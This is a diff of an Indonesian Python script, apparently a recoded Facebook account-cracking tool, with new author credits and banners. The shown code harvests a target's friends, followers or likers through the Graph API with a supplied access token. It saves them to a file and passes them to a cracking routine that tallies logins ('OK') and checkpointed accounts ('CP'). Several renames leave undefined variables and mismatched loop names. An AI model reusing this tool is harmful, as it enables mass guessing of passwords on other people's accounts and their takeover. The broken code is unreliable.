@@ -3,14 +3,14 @@
 # Made With ❤️ By Dapunta And XNSCODE Project
 # Update V0.1
 
-# Copyright© Dapunta ID 2021
+# Copyright© Daputa X Zez11 ID 2021/2022
 # 100% Open Source Code
 
 # Author : Dapunta Adyapaksi R.
 # Facebook (Zez)   : Facebook.com/zez
-# Instagram (☬ 𝐀𝐧𝐨𝐧𝐲𝐦 𝟒𝟎𝟒 ☬)    : Instagram.com/ratya.anonym.id
+# Instagram (☬ 𝐀𝐧𝐨𝐧𝐲𝐦 𝟒𝟎𝟒 ☬)    : gak punya
 # Whatsapp (Dapunta Bot_Key)      : 0858******16
-# YouTube (Xayonara.ID)           : Youtube.com/channel/UCZqnZlJ0jfoWSnXrNEj5JHA
+# YouTube (Xayonara.ID)           : gak punya ngen
 
 # Free Recode For Personal Use
 # Bebas Recode Untuk Penggunaan Pribadi
@@ -55,9 +55,9 @@ _U_ = "\x1b[0;95m" # Ungu
 
 ### Logo
 _logo_line_1_ = ('%s ____   _                           '%(_P_))
-_logo_line_2_ = ('%s |_  /   / |                      %s┌─────────────────────────┐'%(_P_,_U_))
-_logo_line_3_ = ('%s / /      | |                      %s│   %s• Code By Dapunta •   %s│'%(_P_,_U_,_P_,_U_))
-_logo_line_4_ = ('%s/___|   |_|                      %s│ %sGithub.com/Dapunta/dmbf %s│'%(_P_,_U_,_P_,_U_))
+_logo_line_2_ = ('%s|_  / / | %s┌─────────────────────────┐'%(_P_,_U_))
+_logo_line_3_ = ('%s / / | | %s│   %s• Code By Zez •   %s│'%(_P_,_U_,_P_,_U_))
+_logo_line_4_ = ('%s/___||_| %s│ %sGithub.com/Zez11 %s│'%(_P_,_U_,_P_,_U_))
 _logo_line_5_ = ('%s  Genzi33 X Zez11 2021└─────────────────────────┘'%(_U_))
 def _my_logo_():
     _dapunta_cici_(_logo_line_1_)
@@ -202,7 +202,7 @@ def _menu_dev_(_Dapunta_Ganteng_Banget_):
     _dapunta_menu__cici_dapunta__ = _cici_dapunta_('%s[%s•%s] %sPilih : '%(_U_,_P_,_U_,_P_))
     _dapunta_cici_('')
     if _dapunta_menu__cici_dapunta__ in ['',' ']:
-        _dapunta_cici_('%s[%s!%s] %sIsi Yang Benar'%(_M_,_P_,_M_,_P_))
+        _dapunta_cici_('%s[%s!%s] %sIsi Yang Benar,ngen'%(_M_,_P_,_M_,_P_))
         time.sleep(2)
         _menu_dev_(_Dapunta_Ganteng_Banget_)
     elif _dapunta_menu__cici_dapunta__ in ['1','01','a']:
@@ -216,18 +216,18 @@ def _menu_dev_(_Dapunta_Ganteng_Banget_):
     elif _dapunta_menu__cici_dapunta__ in ['5','05','e']:
         _ugen_dev_(_Dapunta_Ganteng_Banget_)
     elif _dapunta_menu__cici_dapunta__ in ['0','00','z']:
-        _dapunta_cici_('%s[%s•%s] %sSampai Jumpa %s%s %s!'%(_U_,_P_,_U_,_P_,_U_,_nama_dev_,_P_))
+        _dapunta_cici_('%s[%s•%s] %sSampai Jumpa,TOD %s%s %s!'%(_U_,_P_,_U_,_P_,_U_,_nama_dev_,_P_))
         _bersih_()
         time.sleep(2)
-        _login_dev_(_Dapunta_Ganteng_Banget_)
+        _login_dev_(_Genz_Ganteng_Banget_)
     else:
         _dapunta_cici_('%s[%s!%s] %sIsi Yang Benar'%(_M_,_P_,_M_,_P_))
         time.sleep(2)
-        _menu_dev_(_Dapunta_Ganteng_Banget_)
+        _menu_dev_(_Genz_Ganteng_Banget_)
 
 ### Dump ID Publik
 def _publik_dev_(_tok_dev_):
-    _Dapunta_Sayang_Cici_ = '__My_Love__'+_oscylopsce_+_escylipsce_+_ascylapsci_+'__Forever__'
+    _Genz_ = '__My_Love__'+_oscylopsce_+_escylipsce_+_ascylapsci_+'__Forever__'
     _dapunta_cici_('%s[%s•%s] %sTulis \'me\' Untuk Mengambil ID Teman'%(_U_,_P_,_U_,_P_))
     _target_dev_ = _cici_dapunta_('%s[%s•%s] %sMasukkan ID Target🖕: %s'%(_U_,_P_,_U_,_P_,_U_))
     try:
@@ -238,28 +238,28 @@ def _publik_dev_(_tok_dev_):
     except:
         _dapunta_cici_('%s[%s!%s] %sToken Invalid / ID Tidak DitemukanTOD'%(_M_,_P_,_M_,_P_))
         time.sleep(2)
-        _menu_dev_(_Dapunta_Sayang_Cici_)
+        _menu_dev_(_Genz_)
     try:
         _req_fl_ = _req_get_("https://graph.facebook.com/%s/friends?limit=1000000&access_token=%s"%(_target_dev_,_tok_dev_))
         _lo_dev_ = _js_lo_(_req_fl_.text)
         _jso_file_ = (_jso_tar_["first_name"]+".json").replace(" ","_")
         _jso_exec_ = _dapunta_dapunta_(_jso_file_,"w")
-        for _Dapunta_Cici_Forever_ in _lo_dev_["data"]:
+        for _Genz_Forever_ in _lo_dev_["data"]:
             try:
-                _id_tampung_.append(_Dapunta_Cici_Forever_["id"]+"•"+_Dapunta_Cici_Forever_["name"])
-                _jso_exec_.write(_Dapunta_Cici_Forever_["id"]+"•"+_Dapunta_Cici_Forever_["name"]+"\n")
+                _id_tampung_.append(_Genz_Forever_["id"]+"•"+_Genz_Forever_["name"])
+                _jso_exec_.write(_Genz_Forever_["id"]+"•"+_Genz_Forever_["name"]+"\n")
             except:continue
         _jso_exec_.close()
         _dapunta_cici_('%s[%s•%s] %sTotal ID : %s%s'%(_U_,_P_,_U_,_P_,_U_,len(_id_tampung_)))
     except:
         _dapunta_cici_('%s[%s!%s] %sToken Invalid / ID Tidak Ditemukan'%(_M_,_P_,_M_,_P_))
         time.sleep(2)
-        _menu_dev_(_Dapunta_Sayang_Cici_)
+        _menu_dev_(_Genz_)
     return _crack_dev_(_jso_file_)
 
 ### Dump ID Pengikut
 def _followers_dev_(_tok_dev_):
-    _Dapunta_Sayang_Cici_ = '__My_Love__'+_oscylopsce_+_escylipsce_+_ascylapsci_+'__Forever__'
+    _Genz_ = '__My_Love__'+_oscylopsce_+_escylipsce_+_ascylapsci_+'__Forever__'
     _dapunta_cici_('%s[%s•%s] %sTulis \'me\' Untuk Mengambil ID Teman'%(_U_,_P_,_U_,_P_))
     _target_dev_ = _cici_dapunta_('%s[%s•%s] %sMasukkan ID Target[🖕]: %s'%(_U_,_P_,_U_,_P_,_U_))
     try:
@@ -270,28 +270,28 @@ def _followers_dev_(_tok_dev_):
     except:
         _dapunta_cici_('%s[%s!%s] %sToken Invalid / ID Tidak Ditemukan'%(_M_,_P_,_M_,_P_))
         time.sleep(2)
-        _menu_dev_(_Dapunta_Sayang_Cici_)
+        _menu_dev_(_Gemz_)
     try:
         _req_fl_ = _req_get_("https://graph.facebook.com/%s/subscribers?limit=1000000&access_token=%s"%(_target_dev_,_tok_dev_))
         _lo_dev_ = _js_lo_(_req_fl_.text)
         _jso_file_ = (_jso_tar_["first_name"]+".json").replace(" ","_")
         _jso_exec_ = _dapunta_dapunta_(_jso_file_,"w")
-        for _Dapunta_Cici_Forever_ in _lo_dev_["data"]:
+        for _Genz_Forever_ in _lo_dev_["data"]:
             try:
-                _id_tampung_.append(_Dapunta_Cici_Forever_["id"]+"•"+_Dapunta_Cici_Forever_["name"])
-                _jso_exec_.write(_Dapunta_Cici_Forever_["id"]+"•"+_Dapunta_Cici_Forever_["name"]+"\n")
+                _id_tampung_.append(_Genz_Forever_["id"]+"•"+_Genz_Forever_["name"])
+                _jso_exec_.write(_Genz_Forever_["id"]+"•"+_Genz_Forever_["name"]+"\n")
             except:continue
         _jso_exec_.close()
         _dapunta_cici_('%s[%s•%s] %sTotal ID : %s%s'%(_U_,_P_,_U_,_P_,_U_,len(_id_tampung_)))
     except:
-        _dapunta_cici_('%s[%s!%s] %sToken Invalid / ID Tidak Ditemukan'%(_M_,_P_,_M_,_P_))
+        _dapunta_cici_('%s[%s!%s] %sToken Invalid / ID Tidak Ditemukan,TOD'%(_M_,_P_,_M_,_P_))
         time.sleep(2)
-        _menu_dev_(_Dapunta_Sayang_Cici_)
+        _menu_dev_(_Zez_)
     return _crack_dev_(_jso_file_)
 
 ### Dump ID Likers
 def _likers_dev_(_tok_dev_):
-    _Dapunta_Sayang_Cici_ = '__My_Love__'+_oscylopsce_+_escylipsce_+_ascylapsci_+'__Forever__'
+    _Genz_ = '__My_Love__'+_oscylopsce_+_escylipsce_+_ascylapsci_+'__Forever__'
     _dapunta_cici_('%s[%s•%s] %sTulis \'me\' Untuk Mengambil ID Teman'%(_U_,_P_,_U_,_P_))
     _target_dev_ = _cici_dapunta_('%s[%s•%s] %sMasukkan ID Target : %s'%(_U_,_P_,_U_,_P_,_U_))
     try:
@@ -302,13 +302,13 @@ def _likers_dev_(_tok_dev_):
     except:
         _dapunta_cici_('%s[%s!%s] %sToken Invalid / ID Tidak Ditemukan'%(_M_,_P_,_M_,_P_))
         time.sleep(2)
-        _menu_dev_(_Dapunta_Sayang_Cici_)
+        _menu_dev_(_Genz_)
     try:
         _req_fl_ = _req_get_("https://graph.facebook.com/%s/likes?limit=1000000&access_token=%s"%(_target_dev_,_tok_dev_))
         _lo_dev_ = _js_lo_(_req_fl_.text)
         _jso_file_ = (_jso_tar_["first_name"]+".json").replace(" ","_")
         _jso_exec_ = _dapunta_dapunta_(_jso_file_,"w")
-        for _Dapunta_Cici_Forever_ in _lo_dev_["data"]:
+        for _Genz_Forever_ in _lo_dev_["data"]:
             try:
                 _id_tampung_.append(_Dapunta_Cici_Forever_["id"]+"•"+_Dapunta_Cici_Forever_["name"])
                 _jso_exec_.write(_Dapunta_Cici_Forever_["id"]+"•"+_Dapunta_Cici_Forever_["name"]+"\n")
@@ -563,7 +563,7 @@ class _crack_dev_:
                     break
                 else:continue
             self._hitung_loop_+=1
-            _dapunta_cici_("\r%s[%sCrack%s][%s%s/%s%s][%sOK:%s%s][%sCP:%s%s]%s"%(_U_,_P_,_U_,_P_,self._hitung_loop_,len(self._files_crack_),_U_,_P_,len(self._ok_dapunta_),_U_,_P_,len(self._cp_dapunta_),_U_,_P_), end=' ');sys.stdout.flush()
+            _dapunta_cici_("\r%s[%sZez11%s][%s%s/%s%s][%sOK:%s%s][%sCP:%s%s]%s"%(_U_,_P_,_U_,_P_,self._hitung_loop_,len(self._files_crack_),_U_,_P_,len(self._ok_dapunta_),_U_,_P_,len(self._cp_dapunta_),_U_,_P_), end=' ');sys.stdout.flush()
         except:
             self.api(_files_crack_)
     def mbasic(self,_files_crack_):
@@ -597,7 +597,7 @@ class _crack_dev_:
                     break
                 else:continue
             self._hitung_loop_+=1
-            _dapunta_cici_("\r%s[%sCrack%s][%s%s/%s%s][%sOK:%s%s][%sCP:%s%s]%s"%(_U_,_P_,_U_,_P_,self._hitung_loop_,len(self._files_crack_),_U_,_P_,len(self._ok_dapunta_),_U_,_P_,len(self._cp_dapunta_),_U_,_P_), end=' ');sys.stdout.flush()
+            _dapunta_cici_("\r%s[%sZez11%s][%s%s/%s%s][%sOK:%s%s][%sCP:%s%s]%s"%(_U_,_P_,_U_,_P_,self._hitung_loop_,len(self._files_crack_),_U_,_P_,len(self._ok_dapunta_),_U_,_P_,len(self._cp_dapunta_),_U_,_P_), end=' ');sys.stdout.flush()
         except:
             self.mbasic(_files_crack_)
 
@@ -606,7 +606,7 @@ def _cek_result_dev_():
     _clear_()
     _my_logo_()
     _Dapunta_Sayang_Cici_ = '__My_Love__'+_oscylopsce_+_escylipsce_+_ascylapsci_+'__Forever__'
-    _dapunta_cici_('%s[ %sHasil Crack[🤣]%s]'%(_U_,_P_,_U_))
+    _dapunta_cici_('%s[ %sHasil Crack[🤔]%s]'%(_U_,_P_,_U_))
     _dapunta_cici_('\n%s[%s1%s] %sCek Hasil OK[👍]'%(_U_,_P_,_U_,_P_))
     _dapunta_cici_('%s[%s2%s] %sCek Hasil CP[🤣]'%(_U_,_P_,_U_,_P_))
     ch = _cici_dapunta_('%s[%s•%s] %sPilih : '%(_U_,_P_,_U_,_P_))
@@ -758,7 +758,7 @@ def _ugen_hp_(_Dapunta_Sayang_Cici_):
         _dapunta_cici_('%s[%s!%s] %sIsi Yang Benar'%(_M_,_P_,_M_,_P_))
         time.sleep(2)
         _menu_dev_(_Dapunta_Sayang_Cici_)
-    _dapunta_cici_("%s[ %sBerhasil Mengganti User Agent %s]"%(_U_,_P_,_U_))
+    _dapunta_cici_("%s[ %sBerhasil Mengganti User Agent👍 %s]"%(_U_,_P_,_U_))
     _cici_dapunta_('\n%s[ %sKembali %s]%s'%(_U_,_P_,_U_,_P_))
     _menu_dev_(_Dapunta_Sayang_Cici_)
 
